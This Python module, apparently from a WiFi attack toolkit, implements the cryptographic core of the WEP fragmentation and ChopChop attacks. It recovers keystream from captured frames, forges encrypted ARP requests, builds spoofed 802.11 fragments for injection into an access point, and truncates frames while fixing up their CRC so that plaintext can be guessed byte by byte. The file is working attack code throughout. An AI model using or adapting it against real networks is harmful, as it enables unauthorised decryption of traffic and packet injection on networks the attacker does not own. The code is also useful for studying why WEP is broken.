"""Pure WEP crypto for fragmentation / chopchop (M5/M6).

EVERYTHING HERE IS OFFLINE-TESTABLE — no hardware (tests/engine/test_wep_crypto.py). The
hardware-in-the-loop part (the oracle: recognizing the AP's relayed frame) lives in
fragmentation.py / chopchop.py.

WEP per-frame layout of the encrypted body (after the 24/26-byte MAC header):
    IV(3) | KeyID(1) | RC4( plaintext ++ ICV )      where ICV = CRC32(plaintext)
The MAC header is cleartext; only plaintext++ICV is RC4'd. Forging needs only the *keystream*
(the IV's RC4 output), never the key — the whole point of frag/chopchop.
"""

from __future__ import annotations

import struct
import zlib

# LLC/SNAP header — the SAME first 6 bytes prefix EVERY 802.11 data frame
# regardless of protocol, which is the known-plaintext foothold for the
# fragmentation seed. The 2-byte ethertype follows (IP 0x0800, ARP 0x0806, …).
_SNAP_HDR = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00])
_SNAP_ARP = _SNAP_HDR + bytes([0x08, 0x06])
_ARP_HDR = bytes([0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01])  # eth/ip, req


def icv(plaintext: bytes) -> bytes:
    """4-byte WEP ICV: CRC-32 of plaintext, little-endian. WEP's ICV is the
    standard IEEE CRC-32 (reflected, init/final 0xFFFFFFFF) — i.e. zlib.crc32."""
    return struct.pack("<I", zlib.crc32(plaintext) & 0xFFFFFFFF)


def wep_encrypt(keystream: bytes, plaintext: bytes) -> bytes:
    """Encrypt under a known keystream → the ciphertext *body* (what follows
    IV+KeyID on the wire): (plaintext ++ icv(plaintext)) XOR keystream.
    Needs len(keystream) >= len(plaintext) + 4."""
    blob = plaintext + icv(plaintext)
    if len(keystream) < len(blob):
        raise ValueError(
            f"keystream too short: need {len(blob)} bytes, have {len(keystream)}"
        )
    return bytes(b ^ k for b, k in zip(blob, keystream))


def arp_request_plaintext(
    *, sender_mac: bytes, sender_ip: bytes, target_ip: bytes
) -> bytes:
    """The 36-byte cleartext of a broadcast ARP request (LLC/SNAP ++ ARP), as
    it sits inside a WEP body before the ICV. Shared by ``forge_arp_request``
    (encrypt it directly when we have >=40 B keystream) and fragmentation
    (chop it into ≤16 tiny fragments when we only have an 8-B seed)."""
    if len(sender_mac) != 6 or len(sender_ip) != 4 or len(target_ip) != 4:
        raise ValueError("sender_mac must be 6 bytes, IPs 4 bytes each")
    return _SNAP_ARP + _ARP_HDR + sender_mac + sender_ip + b"\x00" * 6 + target_ip


def forge_arp_request(
    keystream: bytes,
    *,
    sender_mac: bytes,
    sender_ip: bytes,
    target_ip: bytes,
) -> bytes:
    """Forge a broadcast ARP-request *encrypted body* from recovered keystream.

    Plaintext = LLC/SNAP ++ ARP-request (36 B), so needs >= 40 B of keystream.
    The caller prepends the IV+KeyID this keystream belongs to and a
    ToDS MAC header before injection. target_mac is all-zero
    (unknown — it's a request)."""
    plaintext = arp_request_plaintext(
        sender_mac=sender_mac, sender_ip=sender_ip, target_ip=target_ip
    )
    return wep_encrypt(keystream, plaintext)


def seed_keystream_from_data(
    cipher: bytes, *, want: int = 8, ethertype: int = 0x0800
) -> bytes:
    """Recover the first ``want`` bytes of keystream (PRGA) from the leading
    ciphertext of ANY captured WEP *data* frame — the fragmentation foothold
    that makes the attack independent of replayable ARPs.

    Every encrypted data frame's plaintext starts with the LLC/SNAP header
    ``AA AA 03 00 00 00`` (6 bytes, protocol-independent) followed by the 2-byte
    ethertype. XOR-ing the first ``want`` ciphertext bytes against that known
    prefix yields keystream tied to the frame's IV. The first 6 bytes are
    certain; bytes 7-8 are right only if ``ethertype`` matches the frame's
    (IP 0x0800 is the common case; the daemon also tries ARP 0x0806). ``cipher``
    is the bytes AFTER the IV+KeyID header (the parser's ``wep_cipher``).
    """
    known = _SNAP_HDR + struct.pack(">H", ethertype)   # SNAP ethertype is BE
    if want < 1 or want > len(known):
        raise ValueError("seed keystream is at most the 8-byte SNAP+ethertype")
    if len(cipher) < want:
        raise ValueError(f"cipher too short: need {want} bytes")
    return bytes(c ^ p for c, p in zip(cipher[:want], known[:want]))


def seed_keystream_from_arp(arp_body: bytes, *, want: int = 8) -> bytes:
    """Seed from a captured broadcast WEP ARP's full encrypted body (``IV(3) ++
    KeyID(1) ++ RC4(plaintext ++ ICV)``) — the ARP-specific convenience.
    Delegates to :func:`seed_keystream_from_data` with the ARP ethertype.
    Prefer the data variant for the daemon (works off any frame)."""
    return seed_keystream_from_data(arp_body[4:], want=want, ethertype=0x0806)


def build_fragments(
    keystream: bytes,
    iv: bytes,
    payload: bytes,
    *,
    bssid: bytes,
    source_mac: bytes,
    dest_mac: bytes,
    key_id: int = 0,
    seq_num: int = 0,
    max_fragments: int = 16,
) -> list[bytes]:
    """Split ``payload`` into ≤``max_fragments`` WEP-encrypted 802.11 fragments,
    all sharing one ``iv``/``keystream`` (legal — each fragment is its own MPDU
    with its own ICV; reusing the IV is exactly what makes a short seed useful).

    Each fragment carries up to ``len(keystream) - 4`` plaintext bytes (4 go to
    the per-fragment ICV). The AP reassembles the decrypted fragments into one
    MSDU, re-encrypts under a single FRESH IV, and (for a broadcast DA) relays
    it — that relayed frame is the attack's prize. Headers: ToDS+Protected,
    More-Fragments set on all but the last, fragment number 0..n-1 in the low
    nibble of Sequence-Control.

    The 802.11 frame layout (no QoS, 3-address) mirrors arp_replay's builder so
    the AP accepts it from our associated STA. Returns the fragment frames in
    order. Pure/offline — verified by a simulated-reassembly round-trip test;
    the LIVE question (does the AP actually reassemble + relay) is the probe's.
    """
    if len(iv) != 3:
        raise ValueError("iv must be 3 bytes")
    if len(bssid) != 6 or len(source_mac) != 6 or len(dest_mac) != 6:
        raise ValueError("bssid/source_mac/dest_mac must be 6 bytes each")
    cap = len(keystream) - 4
    if cap < 1:
        raise ValueError("keystream too short: need >=5 bytes (1 data + 4 ICV)")
    chunks = [payload[i : i + cap] for i in range(0, len(payload), cap)] or [b""]
    if len(chunks) > max_fragments:
        raise ValueError(
            f"payload needs {len(chunks)} fragments > max {max_fragments} "
            f"(seed too short: {cap} data bytes/fragment)"
        )
    keyid_byte = bytes([(key_id & 0x03) << 6])
    frames = []
    for i, chunk in enumerate(chunks):
        more_frag = 0x04 if i < len(chunks) - 1 else 0x00
        fc1 = 0x01 | 0x40 | more_frag         # ToDS + Protected (+ MoreFrag)
        seq_ctl = struct.pack("<H", ((seq_num & 0xFFF) << 4) | (i & 0x0F))
        header = (
            b"\x08" + bytes([fc1]) + b"\x00\x00"   # FC + Duration
            + bssid + source_mac + dest_mac        # Addr1=RA, Addr2=TA, Addr3=DA
            + seq_ctl
        )
        body = iv + keyid_byte + wep_encrypt(keystream, chunk)
        frames.append(header + body)
    return frames


# The CRC32 residue: crc32(data ++ icv(data)) == this constant for ALL data
# (verified offline). A WEP frame's plaintext P = data++icv is valid iff
# crc32(P) == CRC32_RESIDUE. This is what lets ChopChop cancel the unknown ICV.
CRC32_RESIDUE = 0x2144DF1C

# CRC-32 table (poly 0xEDB88320, reflected — same CRC as zlib/WEP) + the
# reverse-lookup of table entries by their top byte (a permutation).
_CRC_TABLE = []
for _n in range(256):
    _c = _n
    for _ in range(8):
        _c = (_c >> 1) ^ 0xEDB88320 if (_c & 1) else _c >> 1
    _CRC_TABLE.append(_c)
_CRC_REV_TOP = {(_CRC_TABLE[_i] >> 24): _i for _i in range(256)}


def _crc_reg(data: bytes, reg: int = 0xFFFFFFFF) -> int:
    """Raw CRC register (no final XOR) after processing ``data``."""
    for byte in data:
        reg = (reg >> 8) ^ _CRC_TABLE[(reg ^ byte) & 0xFF]
    return reg


def _crc(data: bytes) -> int:
    """CRC-32 of data (matches zlib.crc32)."""
    return _crc_reg(data) ^ 0xFFFFFFFF


def _reverse_crc_byte(reg_after: int, byte: int) -> int:
    """Inverse of one CRC step: given the register AFTER processing ``byte`` and
    the byte, recover the register before. (Top byte of reg_after uniquely
    picks the table entry that was XORed in.)"""
    idx = _CRC_REV_TOP[reg_after >> 24]
    return (((reg_after ^ _CRC_TABLE[idx]) << 8) & 0xFFFFFFFF) | ((idx ^ byte) & 0xFF)


def _gf2_solve(cols: list, y: int) -> int:
    """Solve XOR_{i : bit i of x set} cols[i] == y over GF(2). cols are 32
    linearly-independent 32-bit vectors (full rank), so x is unique."""
    pivots = {}  # high-bit -> (reduced vector, combination tag)
    for i, vec in enumerate(cols):
        v, tag = vec, 1 << i
        for bit in range(31, -1, -1):
            if not (v >> bit) & 1:
                continue
            if bit in pivots:
                pv, pt = pivots[bit]
                v ^= pv
                tag ^= pt
            else:
                pivots[bit] = (v, tag)
                break
    x, yv = 0, y
    for bit in range(31, -1, -1):
        if not (yv >> bit) & 1:
            continue
        pv, pt = pivots[bit]
        yv ^= pv
        x ^= pt
    return x


def _patch_zeros(zlen: int, target_crc: int) -> bytes:
    """Find the 4 bytes ``corr`` such that crc32(0^zlen ++ corr) == target_crc.
    The map corr -> crc is affine + bijective, so solve it linearly."""
    base = _crc(b"\x00" * zlen + b"\x00\x00\x00\x00")
    cols = [
        _crc(b"\x00" * zlen + (1 << i).to_bytes(4, "little")) ^ base
        for i in range(32)
    ]
    return _gf2_solve(cols, target_crc ^ base).to_bytes(4, "little")


def chop_last_byte_and_fixup(body: bytes, plaintext_guess: int) -> bytes:
    """ChopChop core: given an encrypted body whose ICV is valid, return a
    one-byte-shorter body whose ICV is ALSO valid IFF ``plaintext_guess`` equals
    the true last plaintext byte P[L-1]. No key needed — that's the attack.

    Result = body[:-1] with its last 4 bytes XORed by a correction ``corr``
    that depends only on the guess and known quantities. Derivation (affine CRC
    + the residue cancel the unknown ICV/keystream):
      P'  = P[:L-1] ^ (0^(L-5) ++ corr);  valid ⟺ crc32(P') == RESIDUE
      crc32(P') = crc32(P[:L-1]) ^ crc32(0^(L-5)++corr) ^ crc32(0^(L-1))  [affine]
      crc32(P[:L-1]) comes from the KNOWN crc32(P)==RESIDUE reversed one step
        over the guessed byte ⇒ solve crc32(0^(L-5)++corr) for corr.
    """
    if len(body) < 5:
        raise ValueError("body too short to chop")
    n1 = len(body) - 1
    reg_p = CRC32_RESIDUE ^ 0xFFFFFFFF                 # register of valid P
    reg_pchop = _reverse_crc_byte(reg_p, plaintext_guess & 0xFF)
    crc_pchop = reg_pchop ^ 0xFFFFFFFF
    target = CRC32_RESIDUE ^ crc_pchop ^ _crc(b"\x00" * n1)
    corr = _patch_zeros(n1 - 4, target)
    out = bytearray(body[:n1])
    for i in range(4):
        out[n1 - 4 + i] ^= corr[i]
    return bytes(out)
